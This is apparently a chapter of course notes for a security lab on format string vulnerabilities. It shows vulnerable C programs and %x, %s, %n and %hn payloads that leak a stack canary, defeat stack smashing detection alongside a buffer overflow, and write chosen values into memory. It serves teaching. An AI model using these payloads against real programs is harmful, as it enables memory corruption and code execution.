@@ -1,0 +1,336 @@
+\chapter{Notes for the Format String Assignment}
+ 
+The format string assignment can be a challenging one. Many students seem to think that the format string assignment (just like the buffer overflow assignment) is about exploiting a buffer overflow and exploiting a format string given the stated methodology. This is not thinking like a security professional.  
+The security mindset should make you think about vulnerabilities as a means to an end. The end, the consequence is what is important. In this way, you should focus not only how to exploit the vulnerabilities, but how they work as well as how else we can take advantage of them beyond the exercises in the assignments.  
+ 
+In terms of the format string assignment, I personally like to think of format string as just another programming language. The same applies to the buffer overflow assignment of course. In both cases the programming language is a bit strange. They are also extremely limited. However, even simple languages can be extremely powerful as we will see. 
+ 
+In fact some researchers think that a program is simply an emulator. In other words a program is a computer. The inputs that you put into the program are the equivalent of the instructions that are executed. In this model of the world, the challenge then becomes how does one ``write'' a new program for this computer given the language that is restricted by the input protocol. 
+ 
+Let’s take a look at the format string by using the following program. 
+
+\begin{code} 
+#include <stdio.h> 
+ 
+int main(int argc, char** argv) 
+{
+  int i = 0xCAFEBABE;
+  char hello[12] = "Hello World\n"; 
+ 
+  if (argc == 2)
+  {
+    printf(argv[1]);
+  }   
+  return (0); 
+} 
+\end{code}
+ 
+Now, I am going to ask you to draw the stack frame diagrams yourself just so you can keep up. If you are good at it then you should be able to visualize the stack anyways. I won’t draw it here. 
+ 
+Given this program, we can just compile it and ignore the warning about format strings. This is a format string lab after all. 
+ 
+Now that we have the program, you can try to execute it. 
+
+\begin{note}
+I have disabled ASLR for these examples. 
+\end{note}
+
+\begin{code} 
+seed@SEED:~/TEST$ gcc format.c
+format.c: In function 'main': 
+format.c:10:5: warning: format not a string literal and no format arguments [-Wformat-security]
+      printf(argv[1]); 
+      ^ 
+seed@SEED:~/TEST$ ./a.out  
+seed@SEED:~/TEST$ ./a.out Hello 
+Hello 
+\end{code}
+ 
+Alright so it works fine. What is the programming language that we are speaking of from before? 
+ 
+The programming language that we are dealing with is the format string escape sequences. You can find the entire list in the man pages, but we are going to deal with three popular ones here \%x, \%s and \%n. 
+ 
+\%x takes the next parameter on the stack and treats it as a long (4 bytes in 32-bit linux) and prints it out as hex. You can try \%hx for half a long (16 bits), \%8x to print out 8 characters or \%08x for 8 chars that is prepended with 0’s. Any one of the modifiers is fine, the important thing is you know what %x does. More info about modifiers can be found in {\em man 3 printf}
+ 
+\%s takes the next 4 bytes from the stack and treats it as a pointer (i.e., an address) and treats that address as a {\tt char*} and prints it out to the screen. 
+ 
+\%n takes the next 4 bytes from the stack and treats it as a pointer to an int (i.e., {\tt int*}) and stores the number of characters written out to the screen thus far using {\em printf} into that memory location. This is a great escape sequence because it is the only ``write'' operation that we have. The other ones are ``read'' operations. 
+ 
+Given our knowledge, we can try things out using our simple program above. 
+ 
+First, we can try it with a bunch of \%x's to see what happens. I separated them using a '.' for clarity but you can choose any character you want really (such as a , so it becomes a csv). 
+
+\begin{code} 
+seed@SEED:~/TEST$ ./a.out %x.%x.%x.%x.%x 
+2f.b7e19dc8.b7fd7858.8000.b7fbf000
+seed@SEED:~/TEST$  
+seed@SEED:~/TEST$ ./a.out $'%x.%x.%x.%x.%x\n' 
+2f.b7e19dc8.b7fd7858.8000.b7fbf000 
+\end{code}
+ 
+As you can see, we also used our bash shell \$'X' trick to get escaped c-strings as input. The '\textbackslash n' at the end makes things easier to see. 
+ 
+The first question that you should ask yourself is what we are seeing. If you think about it, we should see something from the stack at a higher address. We see something like addresses (the ones that start with 0xb7… but we can’t seem to be able to make much of it. The next thing that we can try is to see if we can add more \%x. In order to read more things from the stack. Let’s see what happens. 
+
+\begin{code} 
+seed@SEED:~/TEST$ ./a.out $'%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x\n'
+2f.b7e19dc8.b7fd7858.8000.b7fbf000.b7fbd244.bffff114.2.0.b7e3ba30.cafebabe.6c6c6548.6f57206f.a646 c72.cc54a300 
+\end{code} 
+
+Now given the output above, we finally start to see something very interesting. We see {\tt cafebabe} at the 11th \%x. We also see some strange {\tt 6c6c6548} thing, which looks interesting. Given what we have learned about the stack layouts, we can conclude that the {\tt cafebabe} output is in fact the value of the local variable {\em i} on the stack. You can test this by making a change to the source code to a different initial value of {\em i}.  
+ 
+Additionally, if you look deeper into {\tt 6c6c...} you will notice that this looks like ASCII and it is. That is the contents of the Hello World message that we stored into the hello buffer. Now if you are wondering why does the char array {\em hello} come before {\em i} even though we declared it afterwards? The compiler normally makes some decisions on how it wants to arrange local variables and sometimes it likes to arrange arrays together and then other variables. I don’t fully understand how it does things, so this is one of those cases where you should run experiments to see how the local variables are organized. Don’t just rely on the source code. 
+ 
+Now we can continue down this track to see if there is anything else that we can see on the stack. I will let you try things out yourself instead. 
+ 
+I will point out that there is something quite interesting in the output that we can only highlight if we execute the program multiple times as follows. 
+
+\begin{code} 
+seed@SEED:~/TEST$ ./a.out $'%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x\n' 
+2f.b7e19dc8.b7fd7858.8000.b7fbf000.b7fbd244.bffff114.2.0.b7e3ba30.cafebabe.6c6c6548.6f57206f.a646 
+c72.5eb7b900 
+seed@SEED:~/TEST$ ./a.out $'%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x\n' 
+2f.b7e19dc8.b7fd7858.8000.b7fbf000.b7fbd244.bffff114.2.0.b7e3ba30.cafebabe.6c6c6548.6f57206f.a646 
+c72.389ef600 
+seed@SEED:~/TEST$ ./a.out $'%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x\n' 
+2f.b7e19dc8.b7fd7858.8000.b7fbf000.b7fbd244.bffff114.2.0.b7e3ba30.cafebabe.6c6c6548.6f57206f.a646 
+c72.63363000 
+seed@SEED:~/TEST$ ./a.out $'%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x\n' 
+2f.b7e19dc8.b7fd7858.8000.b7fbf000.b7fbd244.bffff114.2.0.b7e3ba30.cafebabe.6c6c6548.6f57206f.a646 
+c72.50272900 
+\end{code}
+ 
+Look at the output and see if there are any values that change. If you look carefully you should see that it appears only the last output (the 15th \%x) changes value. It is also interesting that it appears the lowest byte is always {\tt 0} ({\tt 0x00}) but there doesn’t seem to be any pattern to the higher bytes.  
+ 
+This last output is the stack canary or cookie. This is the value that is used to detect whether a stack overflow has occurred. Imagine if the buffer hello is vulnerable to a buffer overflow. What would happen if we overflowed it? 
+ 
+If you look at the output the {\tt 6c6c...} is the start of the hello buffer. The further down the output the further up memory (down the stack) we go, inching closer and closer to the return address. So if there is indeed a buffer overflow, we will start to overwrite the buffer, then overwrite the stack canary and then overwrite the return address. Since the stack canary is a random value, it is hard for us to predict what value to overwrite and therefore we can’t pass this test. 
+ 
+Stack canaries, as you can imagine, are only effective if we don’t know what the canary value is. A format string vulnerability allows us to read data off the stack and therefore we can use it to read the stack canary and perhaps use it later in a multi-vulnerability exploit. 
+ 
+Before we see how this might work, we can first confirm that this is indeed a stack canary by looking a couple positions more into the stack. The canary should appear right before the saved ebp and the saved return address. The only problem is that main doesn’t use the standard function prolog. You can investigate this yourself if you wish. 
+ 
+To see things more clearly, we can move the vulnerability into its own function. Additionally, we will make a slight change to the program as preparation for our the multi-vulnerability demonstration. 
+
+\begin{code} 
+#include <stdio.h> 
+ 
+void f(char* argv1) 
+{   
+  int i = 0xCAFEBABE; 
+  char hello[12] = "Hello World\n";  
+  printf(argv1);  
+  sleep(30); 
+ 
+  FILE* fp = fopen("badinput.txt", "r");  
+  if (fp != NULL)   
+  {
+    fread(hello, 32, 1, fp); 
+    fclose(fp); 
+  }     
+  return; 
+}   
+
+int main(int argc, char** argv) 
+{ 
+  if (argc == 2) 
+  {  
+    f(argv[1]);
+  }  
+  return (0); 
+} 
+\end{code}
+ 
+If we compiled and ran this one then we will see something like 
+
+\begin{code} 
+seed@SEED:~/TEST$ ./a.out $'%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x\n' 
+b7fff918.bffff020.80482b7.0.bffff0b4.b7fbf000.bffff2f8.ffffffff.2f.cafebabe.b7fd7858.6c6c6548.6f57206f.a64 
+6c72.6fb51800.2.0.bffff068.8048606 
+seed@SEED:~/TEST$ ./a.out $'%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x\n' 
+b7fff918.bffff020.80482b7.0.bffff0b4.b7fbf000.bffff2f8.ffffffff.2f.cafebabe.b7fd7858.6c6c6548.6f57206f.a64 
+6c72.d0283600.2.0.bffff068.8048606 
+\end{code} 
+ 
+Notice that there are a couple of extra bytes in between the canary and the saved ebp and the return address (the last two value). We can confirm that 0x8048606 is indeed the saved return address by checking the objdump. See how the instruction after the call is indeed 0x8048606 
+
+\begin{code} 
+seed@SEED:~/TEST$ objdump -d a.out | grep -A 1 "call.*<f>"  
+ 8048601: e8 35 ff ff ff call   804853b <f> 
+ 8048606: 83 c4 10 add    $0x10,%esp 
+\end{code}
+ 
+Now that we have everything together, we can run a couple of experiments. First, lets see what happens when we populate the file with random stuff. 
+
+\begin{code} 
+seed@SEED:~/TEST$ truncate --size 0 badinput.txt; for i in {1..9}; do echo -n $'\xca\xfe\xba\xbe' >> badinput.txt; done 
+seed@SEED:~/TEST$ more badinput.txt  ������������������������������������ 
+seed@SEED:~/TEST$ ./a.out $'%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x\n' 
+b7fff918.bffff020.80482b7.0.bffff0b4.b7fbf000.bffff2f8.ffffffff.2f.cafebabe.b7fd7858.6c6c6548.6f57206f.a64 
+6c72.64986800.2.0.bffff068.8048606 
+*** stack smashing detected ***: ./a.out terminated 
+Aborted (core dumped) 
+\end{code}
+ 
+The first compound bash command truncates the file {\em badinput.txt}, then fills it with 9 {\tt cafebabe}s (this is not exactly right as we will see in a little bit). The second command shows the file and then the third executes our vulnerable program. As you can see we have a message that states stack smashing detected. 
+ 
+This means that the stack canary has changed due to our buffer overflow. You can verify this by inserting another {\em printf(argv1)} right before the return statement for example. If you do this, then you should see that the canary has changed to {\tt 0xbebafeca}.  
+ 
+Now to see how we might use the format string to our advantage, we can open up a new terminal and execute a.out in that window. We can then read out the canary value out and then insert it into our little compound script in another window to populate the badinput.txt with the canary value. If we do things right, then we should expect the canary value to remain intact but the return value is now overwritten with the same canary value and thus cause a segmentation fault. 
+ 
+Here is an attempt. First window 
+
+\begin{code} 
+seed@SEED:~/TEST$ ./a.out $'%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x\n' 
+b7fff918.bffff050.80482b7.0.bffff0e4.b7fbf000.bffff31b.ffffffff.2f.cafebabe.b7fd7858.6c6c6548.6f57206f.a64 
+6c72.fbd16500.2.0.bffff098.8048606 
+*** stack smashing detected ***: ./a.out terminated 
+Aborted (core dumped) 
+\end{code}
+ 
+Second window - we ran this by reading the canary value {\tt 0xfbd16500} from the output and then inserting it into our script while the program is sleeping. 
+
+\begin{code} 
+seed@SEED:~/TEST$ truncate --size 0 badinput.txt; for i in {1..9}; do echo -n $'\xfb\xd1\x65\x00' >> badinput.txt; done 
+\end{code}
+ 
+Hmm. It didn't work. Let’s try again. 
+ 
+First: 
+
+\begin{code}
+seed@SEED:~/TEST$ ./a.out $'%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x\n' 
+b7fff918.bffff050.80482b7.0.bffff0e4.b7fbf000.bffff31b.ffffffff.2f.cafebabe.b7fd7858.6c6c6548.6f57206f.a64 
+6c72.7a881300.2.0.bffff098.8048606 
+\end{code}
+ 
+Second 
+
+\begin{code} 
+seed@SEED:~/TEST$ truncate --size 0 badinput.txt; for i in {1..9}; do echo -n $'\x00\x13\x88\x7a' >> badinput.txt; done 
+\end{code}
+
+It is interesting that the program didn't crash. I expected a segmentation fault, but we didn't get it. The good news is that we didn't get a stack smashing detected error. Notice the 
+difference in how I inserted the canary in reverse order this second time - we do this because of i386’s use of little endian. 
+ 
+I will let you fiddle with the program (e.g. increase the number of bytes read) as well as play around a little bit yourself in order to attain the segmentation fault that we were expecting. Have you figured out why it didn't crash yet? Do you see how we are not actually overwriting the return address? 
+ 
+The magic of \%n.  
+ 
+The previous example only used \%x to read a number of values from the stack. We were then able to find the stack canary, read it out and then used it as part of our buffer overflow and thus evaded the stack smashing detection.  
+ 
+Now we will try to have a little bit more fun with \%n. To do this we will introduce a new program as follows. 
+
+\begin{code} 
+#include <stdio.h> 
+ 
+int main(int argc, char** argv) 
+{ 
+  int i = 0x45424142; 
+  int* ip1 = &i; 
+  char* ip2 = (char*)(&i); 
+  unsigned int ip3 = (unsigned int)(&i); 
+ 
+  if (argc == 2) 
+  { 
+    printf(argv[1]); 
+  } 
+  return (0); 
+} 
+\end{code}
+ 
+In this program, I did a few things on purpose. The first is I created an {\em int} pointer, {\em char} pointer an unsigned int all initialized with the value of the address of {\em i}. I did this to demonstrate that it doesn’t matter what the type is in C, when it comes to the computer itself, the value is interpreted by the instruction. In the case of \%n, the value will be interpreted as an {\em int*} and in the case of \%s it will be interpreted as a {\em char*}. Therefore, don’t get stuck on the types. The CPU doesn’t care about  high level types. 
+ 
+If we compiled this program and executed the same input as we did previously we see something like this: 
+\begin{code} 
+seed@SEED:~/TEST$ ./a.out $'%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x\n' 
+2f.b7e19dc8.b7fd7858.8000.b7fbf000.b7fbd244.bffff114.2.0.b7e3ba30.45424142.bffff04c.bffff04c.bffff04c. 
+ee862b00 
+seed@SEED:~/TEST$ ./a.out $'%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x\n' 
+2f.b7e19dc8.b7fd7858.8000.b7fbf000.b7fbd244.bffff114.2.0.b7e3ba30.45424142.bffff04c.bffff04c.bffff04c. 
+96cabc00 
+\end{code}
+ 
+Notice how we see {\em 0xbffff04c} three times, each corresponding to one of the {\em ip}s in the source. Type doesn’t matter. 
+ 
+Since we know that the 12, 13 and 14th \%x is reading the {\em ip}s off the stack, we can also reinterpret them as c-strings instead of longs. What I mean by this is we can change the 14th \%x into \%s for example. 
+
+\begin{code} 
+seed@SEED:~/TEST$ ./a.out $'%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%s.%x\n' 
+2f.b7e19dc8.b7fd7858.8000.b7fbf000.b7fbd244.bffff114.2.0.b7e3ba30.45424142.bffff04c.bffff04 
+c.BABEL���L���L���.1a42d000 
+\end{code}
+ 
+Notice how we now see {\tt BABEL...} instead of {\tt bffff04c}. This is expected because {\tt 0x45424142} is {\tt BABE} in reverse order (little endian again). Why do we see an {\tt L}? That is because {\tt 0x4C} (the lowest byte of the address (the next byte on the stack) is the ASCII for the letter 'L'. 
+ 
+But the purpose of this exercise is to try \%n. So let’s do it. 
+ 
+You can try to change the 14th \%x into a \%n, but we won’t do that. Instead we will change the 12th one.  
+
+\begin{code} 
+seed@SEED:~/TEST$ ./a.out $'%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%n.%x.%x.%x\n' 
+2f.b7e19dc8.b7fd7858.8000.b7fbf000.b7fbd244.bffff114.2.0.b7e3ba30.45424142..bffff04c.bffff0 
+4c.bfb5a900 
+\end{code}
+ 
+Notice how nothing seemed to have changed in the output except we have two dots after {\tt 0x45424142}. This should make sense since \%n only stores the number of characters written out so far into the int pointed to by that address (that is {\em *ip = count}). Nothing is written out.  
+ 
+So how do we see if it worked? We have already done this before. We can use a \%s to use one of the other addresses to treat it as a c-string and print it out. Thus, let’s combine the two previous inputs and change the 12th \%x into \%s, the 13th into \%n and the 14th into \%s. 
+
+\begin{code} 
+seed@SEED:~/TEST$ ./a.out $'%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%s.%n.%s.%x\n' 
+2f.b7e19dc8.b7fd7858.8000.b7fbf000.b7fbd244.bffff114.2.0.b7e3ba30.45424142.BABEL���L���L�� 
+�..\.c50b7100 
+\end{code} 
+ 
+
+ 
+ 
+Notice how the first time we printed out the contents as a c-string we get the BABEL… as before, but the second time we get this funny '\textbackslash' character. Why '\textbackslash'? If our understanding of \%n is correct, then '\textbackslash' should be the ASCII character that corresponds to the number of characters printed out by the time we get to the \%n. I’ll let you verify this yourself by counting the number of characters in \inlinedcode{2f.b7e19dc8.b7fd7858.8000.b7fbf000.b7fbd244.bffff114.2.0.b7e3ba30.45424142.BABEL���L ���L���.} (NOTE: the ? should only count as 1 character. So be careful when you are counting.) 
+ 
+At this point we now know that if we have an address on the stack then we can use a \%n to write the number of characters to the location of that address. If only we can control the number of characters written right? 
+ 
+We can control the number of characters written by using \%\#x for example where \# is a number. 
+ 
+The example below illustrates this by forcing the first value to be printed in the default (2) then 3 and then 4 character spaces. You can see how the value changes from K to L to M which is expected. 
+\begin{code} 
+seed@SEED:~/TEST$ ./a.out $'%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%n.%s.%x.%x\n'
+2f.b7e19dc8.b7fd7858.8000.b7fbf000.b7fbd2 44.bffff114.2.0.b7e3ba30.45424142..K.bffff04c.6f78db00 
+seed@SEED:~/TEST$ ./a.out $'%3x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%n.%s.%x.%x\n'  
+2f.b7e19dc8.b7fd7858.8000.b7fbf000.b7fbd244.bffff114.2.0.b7e3ba30.45424142..L.bffff04c.d6c56400 
+seed@SEED:~/TEST$ ./a.out $'%4x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%n.%s.%x.%x\n'   
+2f.b7e19dc8.b7fd7858.8000.b7fbf000.b7fbd244.bffff114.2.0.b7e3ba30.45424142..M.bffff04c.139d0300 
+\end{code} 
+
+In fact, we can make the contents of {\em i} be anything that we want. For example, we can have it say {\tt Hi}. To do this, we must figure out how many characters we need to get to the equivalent of {\tt Hi}. 
+ 
+{\tt Hi} in ASCII is {\tt 0x48}, {\tt 0x69}. Once again, because of little endian we actually want {\tt 0x6948} which is the same as {\tt 26952} in decimal. That is, if we have printed out 26952 characters by the time the printf function reaches the \%n, then we should be able to write the value {\tt 0x6948} into the memory location pointed to by the current value on the stack. Given that the default input gives us 'K' which is 75 in decimal ASCII. We therefore need a total of 26952-75 = 26877 more characters.  
+ 
+We can do this by taking a look at the output of the first \%x for example. It currently prints out 2 charts “2f” and thus if we need 26877 more characters than these two meaning we can change 
+the first \%x into \%26879x. Doing so will give us a very long output and thus we will show only part of the output. 
+\begin{code} 
+seed@SEED:~/TEST$ ./a.out $'%26879x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%n.%s.%x.%x\n' 
+ 
+2f.b7e19dc8.b7fd7858.8000.b7fbf000.b7fbd244.bffff114.2.0.b7e3ba30.45424142..Hi.bffff04c.60d8d200 
+\end{code} 
+Notice, how the value of {\em i} when printed out with \%s is now {\tt Hi}.  
+ 
+What this means is that we can now control the actual value being written to a target memory address.  
+ 
+Note that you are free to use other format string escape sequences aside from \%x. You can also use something like \%8x instead of \%x to ensure that we will always have 8 characters for each \%x no matter what. This helps if the value on the stack changes. For example if there is a value on the stack that was {\tt 0x41} one time and {\tt 0x4141} another, then the first time the \%x will print out {\tt 41} which is 2 characters and the second time it will print out {\tt 4141} which is 4. \%8x will always take 8 characters which makes it more predictable. 
+ 
+Finally, you can try to play around with \%hn to overwrite 16-bits at a time. This is useful if you ever need to overflow. For example, how would we get the value of {\em i} to be {\tt 0x41} ('A') when our current input already takes up 75 spaces. We can do this by printing out so many characters that the lower 16 bytes of the {\em int} counter effectively overflows. That is instead of printing out {\tt 0x41} characters, we need to print out {\tt 0x10041} characters and then only write the 16 bits into the target address. 
+ 
+For example 
+\begin{code} 
+seed@SEED:~/TEST$ ./a.out $'%65528x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%hn.%s.%x.%x\n' 
+ 
+2f.b7e19dc8.b7fd7858.8000.b7fbf000.b7fbd244.bffff114.2.0.b7e3ba30.45424142..A.bffff04c.36a 
+f5900 
+\end{code} 
+
+How do we control the address? 
+ 
+The last question that we can ask is how does one control the address to be written? I will mainly leave this as an exercise to you. The main idea is to control a variable on the stack. For example, if you can imagine that the {\em i} variable was actually based on user input. If it was, then you would be able to write a value to “i” and then instead of changing the 12th \%x, you can use the 11th \%x (where {\em i} is) and change it to \%n for example. It doesn't have to be an int either, all you need to do is control something higher up in memory or equivalently lower in the stack. 
+ 
+You should experiment with this. You should also try to overwrite a return address using format strings and thus execute arbitrary code as well. This is a bit more challenging but it can be fun. 
